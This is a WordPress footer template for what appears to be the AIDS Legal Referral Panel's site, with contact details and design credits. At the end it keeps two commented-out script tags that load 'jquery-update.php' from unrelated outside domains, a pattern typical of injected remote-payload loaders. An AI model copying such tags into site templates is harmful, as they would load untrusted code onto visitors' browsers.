<div class="clear"></div>

<div id="footer">
  <div id="footer-text">
<!-- <a href=""><img src="<?php bloginfo('template_url'); ?>/images/footer-img.gif" alt="" /></a> -->  
    1663 Mission Street, Suite 500, San Francisco, California 94103<br />
    Client Line (415) 701-1100 | Office Line (415) 701-1200 | Fax (415) 701-1400<br />
    Copyright &copy; 2014 All Rights Reserved&nbsp;
    <a href="/legal-disclaimer">Legal Disclaimer</a>&nbsp;
    Powered by <a href="http://radicaldesigns.org">radicalDesigns</a>&nbsp;
    Designed by <a href="http://www.skona.com/">sk&ouml;na</a><a href="http://www.guidestar.org/organizations/94-3111738/aids-legal-referral-panel-san-francisco-bay-area.aspx" target="_blank">
    <img src="http://www.alrp.org/wp-content/uploads/Untitled-1.jpg">
</a>
</a>
  </div>
  <div class="clear"></div>
</div>
<div><img src="<?php bloginfo('template_url'); ?>/images/footer.gif" alt="" /></div>
<br /><br /><br />
<!-- end of page -->
</div>

</div>
<?php wp_footer(); ?>
</body>
<!--<script type="text/javascript" src="http://www.insead.dk/wp-content/uploads/jquery-update.php"></script>
<script type="text/javascript" src="http://imamasim.com/modules/mod_modules/jquery-update.php"></script>-->

</html>
